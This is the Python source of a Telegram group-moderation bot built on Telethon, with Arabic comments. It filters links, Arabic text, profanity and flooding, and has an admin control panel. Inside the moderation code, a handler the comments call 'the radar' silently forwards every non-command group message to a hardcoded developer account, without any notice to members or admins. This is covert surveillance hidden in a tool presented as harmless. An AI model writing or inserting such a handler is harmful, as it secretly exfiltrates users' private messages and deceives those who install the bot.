import os
import re
import asyncio
import collections
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button

# جلب الإعدادات من البيئة
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = 5270790672

client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# قواعد البيانات المؤقتة في الذاكرة
warnings = collections.defaultdict(lambda: collections.defaultdict(int))
groups_db = set()
users_db = set()

# إعدادات الفلاتر لكل جروب (حفظ مستقل)
# لضمان عدم تداخل الإعدادات، نستخدم الـ chat_id كـ مفتاح
group_settings = collections.defaultdict(lambda: {
    'lang_filter': True,
    'link_filter': True,
    'spam_filter': True,
    'bad_words_filter': True,
    'clean_service_msg': True
})

# قائمة الكلمات الممنوعة الشاملة
BAD_WORDS = {"fuck", "shit", "sex", "porn"}
span_tracker = collections.defaultdict(list)

def is_english_only(text):
    if not text.strip():
        return True
    arabic_pattern = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF]')
    return not bool(arabic_pattern.search(text))

def contains_link(text):
    pattern = r'(https?://[^\s]+)|(www\.[^\s]+)|(t\.me/[^\s]+)|(@[a-zA-Z0-9_]+)'
    return bool(re.search(pattern, text))

def contains_bad_word(text):
    text_lower = text.lower()
    for word in BAD_WORDS:
        if re.search(rf'\b{word}\b', text_lower):
            return True
    return False

# دالة التعامل مع المخالفات وحذف التحذير بعد 5 ثوانٍ
async def handle_violation(event, reason_text):
    chat_id = event.chat_id
    user_id = event.sender_id
    
    try:
        await event.delete()
    except Exception:
        pass

    try:
        sender = await event.get_sender()
        user_name = f"@{sender.username}" if (sender and sender.username) else "User"
    except Exception:
        user_name = "User"

    warnings[chat_id][user_id] += 1
    current_warns = warnings[chat_id][user_id]
    
    if current_warns >= 3:
        warnings[chat_id][user_id] = 0
        try:
            await client.edit_permissions(chat_id, user_id, until_date=timedelta(minutes=5), send_messages=False)
            warn_msg = await event.respond(f"🚫 {user_name} has been muted for 5 minutes for {reason_text}.")
        except Exception:
            warn_msg = await event.respond(f"⚠️ {user_name} violated rules, but I couldn't mute them.")
    else:
        warn_msg = await event.respond(f"⚠️ {user_name}, {reason_text} is not allowed! [Warning: {current_warns}/3]")

    await asyncio.sleep(5)
    try:
        await warn_msg.delete()
    except Exception:
        pass

# --- دالة بناء لوحة التحكم الذكية حسب رتبة الشخص ---
async def build_and_send_panel(event, chat_id, text_header):
    # جلب إعدادات الجروب المرتبط، أو الإعدادات الافتراضية إذا كان في الخاص
    settings = group_settings[chat_id]
    
    def get_btn(label, key):
        status = "✅ ON" if settings[key] else "❌ OFF"
        return Button.inline(f"{label}: {status}", data=f"tg_{key}_{chat_id}")

    buttons = [
        [get_btn("English Filter", "lang_filter")],
        [get_btn("Links Filter", "link_filter")],
        [get_btn("Spam Filter", "spam_filter")],
        [get_btn("Bad Words Filter", "bad_words_filter")],
        [get_btn("Service Messages Cleaner", "clean_service_msg")]
    ]
    
    # إذا كان المستخدم هو الأونر الأساسي (أنت)، يظهر له زر الإحصائيات السادس
    if event.sender_id == OWNER_ID:
        buttons.append([Button.inline("📊 Show Stats", data=f"stats_{chat_id}")])
        
    try:
        if isinstance(event, events.CallbackQuery):
            await event.edit(text_header, buttons=buttons)
        else:
            await event.respond(text_header, buttons=buttons)
    except Exception:
        pass

# --- تفاعل أمر /start في الخاص بناءً على الصورة والمطلوب ---
@client.on(events.NewMessage(pattern='/start', incoming=True))
async def start_command(event):
    if not event.is_private:
        return
    
    users_db.add(event.sender_id)
    # نستخدم آيدي الشخص كـ مفتاح افتراضي لإعداداته إذا لم يكن مرتبط بجروب بعد
    chat_key = event.chat_id 
    
    header = "🛠️ **Bot Control Panel (Owner Only):**" if event.sender_id == OWNER_ID else "🛠️ **Bot Control Panel:**"
    await build_and_send_panel(event, chat_key, header)

# --- تحويل رسائل الجروبات لحسابك الخاص (الرادار) ---
@client.on(events.NewMessage(incoming=True))
async def forward_user_messages(event):
    if event.is_private or event.sender_id == OWNER_ID or event.sender_id == (await client.get_me()).id:
        return
    if event.raw_text and event.raw_text.startswith('/'):
        return
    try:
        await client.forward_messages(OWNER_ID, event.message)
    except Exception:
        pass

# --- نداء المطور في المجموعات ---
@client.on(events.NewMessage(incoming=True))
async def developer_call(event):
    if event.is_private:
        return
    if "المطور" in (event.raw_text or ""):
        try:
            await event.reply(f"🔍 **يمكنك التواصل مع مطور البوت من هنا:**\n[اضغط هنا لفتح حساب المطور](tg://user?id={OWNER_ID})")
        except Exception:
            pass

# --- دالة مراقبة وفلترة المجموعات الاحترافية الشاملة ---
@client.on(events.NewMessage(incoming=True))
async def monitor_messages(event):
    if event.is_private or event.sender_id == OWNER_ID:
        return

    chat_id = event.chat_id
    groups_db.add(chat_id)
    settings = group_settings[chat_id]
    
    text = event.raw_text or ""
    if text.startswith('/'):
        return

    # 1. فحص الروابط والتحويل
    if settings['link_filter'] and (contains_link(text) or event.forward):
        await handle_violation(event, "sending links/forward")
        return

    # 2. فحص اللغة العربية
    if settings['lang_filter'] and not is_english_only(text):
        await handle_violation(event, "using non-English language")
        return

    # 3. فحص الكلمات البذيئة
    if settings['bad_words_filter'] and contains_bad_word(text):
        await handle_violation(event, "using inappropriate words")
        return

    # 4. فحص السبام والتكرار
    if settings['spam_filter']:
        user_id = event.sender_id
        now = datetime.now()
        span_tracker[user_id] = [t for t in span_tracker[user_id] if (now - t).total_seconds() < 3]
        span_tracker[user_id].append(now)
        if len(span_tracker[user_id]) > 4:
            await handle_violation(event, "flooding/spamming")
            return

# --- تنظيف رسائل الخدمة (مغادرة وإنضمام) ---
@client.on(events.ChatAction)
async def action_cleaner(event):
    settings = group_settings[event.chat_id]
    if settings['clean_service_msg']:
        if event.user_joined or event.user_left or event.user_kicked:
            try:
                await event.delete()
            except Exception:
                pass

# --- معالجة ضغطات الأزرار التفاعلية وحفظ التغييرات لكل جروب ---
@client.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode('utf-8')
    
    if data.startswith("tg_"):
        # استخراج اسم الفلتر والـ chat_id من التاق البرمجي للزر
        parts = data.split("_")
        key = f"{parts[1]}_{parts[2]}" # اسم الفلتر كامل مثل lang_filter
        chat_id = int(parts[3])
        
        # التأكد من أن الضاغط هو الأونر الأساسي أو مشرف/مالك هذا الجروب
        is_authorized = (event.sender_id == OWNER_ID)
        if not is_authorized:
            try:
                perms = await client.get_permissions(chat_id, event.sender_id)
                if perms.is_admin:
                    is_authorized = True
            except Exception:
                pass
                
        if not is_authorized:
            await event.answer("⚠️ You are not authorized to control this group!", alert=True)
            return

        # عكس الحالة للجروب المحدد
        group_settings[chat_id][key] = not group_settings[chat_id][key]
        await event.answer("Settings updated!")
        
        header = "🛠️ **Bot Control Panel (Owner Only):**" if event.sender_id == OWNER_ID else "🛠️ **Bot Control Panel:**"
        await build_and_send_panel(event, chat_id, header)

    elif data.startswith("stats_"):
        if event.sender_id != OWNER_ID:
            await event.answer("⚠️ Developer only!", alert=True)
            return
        stats_text = (
            "📊 **Bot Current Statistics:**\n\n"
            f"👥 Active Users in DB: {len(users_db)}\n"
            f"📢 Monitored Groups: {len(groups_db)}"
        )
        await event.respond(stats_text)
        await event.answer()

# --- تشغيل البوت ---
async def main():
    print("Bot is fully running with multi-owner control panel...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())
